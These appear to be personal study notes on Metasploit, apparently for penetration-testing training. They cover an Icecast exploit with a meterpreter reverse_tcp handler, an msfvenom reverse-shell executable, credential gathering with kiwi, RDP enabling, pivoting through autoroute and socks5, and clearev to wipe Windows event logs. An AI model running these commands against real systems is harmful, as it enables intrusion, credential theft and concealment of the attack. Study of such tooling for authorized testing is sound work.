## Metasploit
?  help alias

## Initialize database

msfdb init

-q  // **no banner**

db_status   // **db status**

connect  // **quick check**

set 

setg  

get 

unset 


spool   // output to a file


save    // save settings



-----------------

## Modules



exploit  //  payload // encoder // NOP // auxiliary


encoder - modify appearance of exploit

NOP - buffer overflow


db_nmap  - **feeds directly into db**

nmap  - just nmap

good to run after db_nmap:
hosts
services
vulns


## example with icecast


```use exploit/windows/http/icecast_header


search multi/handler

use <@#> exploit/multi/handler

set PAYLOAD windows/meterpreter/reverse_tcp

run -j     //  (-j run as job) 
```



Interact with a session

`sessions -i <SESSION_NUMBER>`


List jobs

`jobs -l`

after connecting, run ps to view processes

we see spoolsv.exe

`migrate <pid>`


doesn't work 


getuid

sysinfo

load kiwi

get privs

upload 

run 

ipconfig

## POST 

`post/windows/gather/checkvm`   // checks if we are in a VM

`run post/multi/recon/local_exploit_suggester`

`run post/windows/manage/enable_rdp`  // need admin 

`shell`    // spawn a normal system shell


CISCO  

run autoroute -h


run autoroute -s 172.18.1.0 -n 255.255.255.0


search server/socks5


auxiliary/server/socks5






# msfvenom

```msfvenom -p <PAYLOAD> <OPTIONS>```


```msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>```


**staged**- good for ids detection, first stage just connects, second stage downloads code


**stageless** - most common, all in one, 

meterpreter shell  -  must be used in msf, banned from certain certifications



```<OS>/<arch>/<payload>```

linux/x86/shell_reverse_tcp


camel case = **stageless**

backslash = **staged**



```msfvenom --list payloads | grep "<OS>/<arch>/<payload>"```


# meterpreter

https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/

to upgrade regular shell to meterpreter shell use

post/multi/manage/shell_to_meterpreter


`clearev`	 will clear the Application, System, and Security logs on a Windows system.











